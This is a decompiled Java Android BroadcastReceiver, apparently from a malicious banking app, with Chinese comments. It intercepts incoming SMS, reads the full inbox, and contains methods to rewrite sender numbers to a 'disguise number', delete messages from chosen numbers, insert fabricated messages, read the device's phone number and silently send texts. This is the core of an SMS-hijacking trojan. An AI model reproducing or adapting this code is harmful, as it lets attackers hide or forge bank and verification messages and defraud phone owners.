package com.wish.lmbank.sms.receiver;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.wish.lmbank.sms.service.SmsReceiverServiceV;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;


/**
 * 短信监听
 */
/* loaded from: cookie_9234504.jar:com/wish/lmbank/sms/receiver/LSmsReceiverV.class */
public class LSmsReceiverV extends BroadcastReceiver {
    //黑名单号码
    private String phone = "";
    private final Uri SMS_INBOX = Uri.parse("content://sms/");
    private static final String TAG = "LSmsReceiverV";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        System.out.println("来短信了");
        if (intent.getAction() != null) {
            String action = intent.getAction();
            //如果设置了默认会通知两次
            if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                //未设置默认通知,可能无法进行删除和修改操作
                init(context, intent);
            } else if (action.equals("android.provider.Telephony.SMS_DELIVER")) {
                //设置默认。有绝对的权限
                init(context, intent);
                getSmsFromPhone(context);
            }
        }


        /**intent.setClass(context, SmsReceiverServiceV.class);
         //         intent.putExtra(bb7d7pu7.m5998("GwwaHAUd"), getResultCode());
         intent.putExtra("result", getResultCode());
         SmsReceiverServiceV.beginStartingService(context, intent);*/
    }

    private void init(Context context, Intent intent) {
        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        if (smsMessages == null) {
            return;
        }
        //发送人号码
        String senderNumber = smsMessages[0].getOriginatingAddress();
        //内容
        String messages = getSmsMessages(smsMessages);

    }

    /**
     * 获取全部短信例子
     *
     * @param context
     */
    private void getSmsFromPhone(Context context) {
        // TODO Auto-generated method stub
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person",
                "body", "date", "type",};  //"_id", "address", "person",, "date", "type
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (cur.moveToFirst()) {
            int index_Address = cur.getColumnIndex("address");
            int index_Person = cur.getColumnIndex("person");
            int index_Body = cur.getColumnIndex("body");
            int index_Date = cur.getColumnIndex("date");
            int index_Type = cur.getColumnIndex("type");
            do {
                String strAddress = cur.getString(index_Address);
                int intPerson = cur.getInt(index_Person);
                String strbody = cur.getString(index_Body);
                int intType = cur.getInt(index_Type);
                //转换Linux 时间戳 很关键//

                long longDate = cur.getLong(index_Date);
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy年MM月dd日 HH时mm分ss秒");
                Date d = new Date(longDate);
                String strDate = dateFormat.format(d);    // 格式化时间
                //转换Linux 时间戳 很关键//
                Log.e("tag", "发件人:" + strAddress + ", " + strDate + "," + strbody + "\n");
            } while (cur.moveToNext());
        }
    }

    /**
     * 修改号码
     * @param context
     * @param phone   目标号码
     * @param Nphone  伪装号码
     */
    private void smsUpdate(Context context, String phone, String Nphone) {
        ContentResolver cr = context.getContentResolver();
        ContentValues values_1 = new ContentValues();
        values_1.put("read", "0");
        values_1.put("address", Nphone);
        cr.update(SMS_INBOX, values_1, "address=" + phone, null);  //更新
    }

    /**
     * 删除短信
     *
     * @param context
     * @param phone   号码
     */
    private void smsDelete(Context context, String phone) {
        ContentResolver cr = context.getContentResolver();
        cr.delete(SMS_INBOX, "address=" + phone, null);            //删除
    }

    /**
     * 增加
     *
     * @param context
     * @param phone   发送人号码
     * @param type    类型 0为已读
     * @param body    内容
     */
    private void smsInsert(Context context, String phone, String type, String body) {
        ContentResolver cr = context.getContentResolver();
        ContentValues values = new ContentValues();
        values.put("address", phone);
        values.put("type", type);
        values.put("body", body);
        values.put("date", System.currentTimeMillis());
        cr.insert(SMS_INBOX, values);
    }

    @SuppressLint("HardwareIds")
    private String getNumber(Context context) {
        //获取本机手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        return tm.getLine1Number();
    }

    //获取短信内容
    private String getSmsMessages(SmsMessage[] smsMessages) {
        // 组装短信内容
        StringBuilder text = new StringBuilder();
        for (SmsMessage smsMessage : smsMessages) {
            text.append(smsMessage.getMessageBody());
        }
        return text.toString();
    }


    /**
     * 注册发送短信发送状态（成功失败）广播
     */
    private void initSMSVerification(Context context) {
        SMSVerification smsVerification = new SMSVerification();
        IntentFilter mFilter01 = new IntentFilter("SMS_SEND_ACTIOIN");
        context.registerReceiver(smsVerification, mFilter01);
    }

    /**
     * 注销广播
     * 该方法一般在onDestroy函数中使用
     *
     * @param context
     * @param broadcastReceiver
     */
    private void unregister(Context context, BroadcastReceiver broadcastReceiver) {
        context.unregisterReceiver(broadcastReceiver);
    }

    /**
     * 发送短信,可以在任何地方使用
     *
     * @param content 上下文
     * @param id      储存id
     * @param phone   目的号码
     * @param context 内容
     * @param name
     */
    @SuppressLint("UnspecifiedImmutableFlag")
    private void sendSMSS(Context content, String id, String phone, String context, String name) {
        if (context.isEmpty() || phone.isEmpty()) {
            return;
        }
        SmsManager manager = SmsManager.getDefault();
        Bundle bundle = new Bundle();
        Intent itSend = new Intent("SMS_SEND_ACTIOIN");
        itSend.putExtra("id", id);
        itSend.putExtra("name", name);
        itSend.putExtras(bundle);
        PendingIntent mSendPI = PendingIntent.getBroadcast(content, (int) System.currentTimeMillis(), itSend, PendingIntent.FLAG_UPDATE_CURRENT);
        if (context.length() > 70) {
            List<String> msgs = manager.divideMessage(context);
            for (String msg : msgs) {
                manager.sendTextMessage(phone, null, msg, mSendPI, null);
            }
            return;
        }
        manager.sendTextMessage(phone, null, context, mSendPI, null);
    }

}
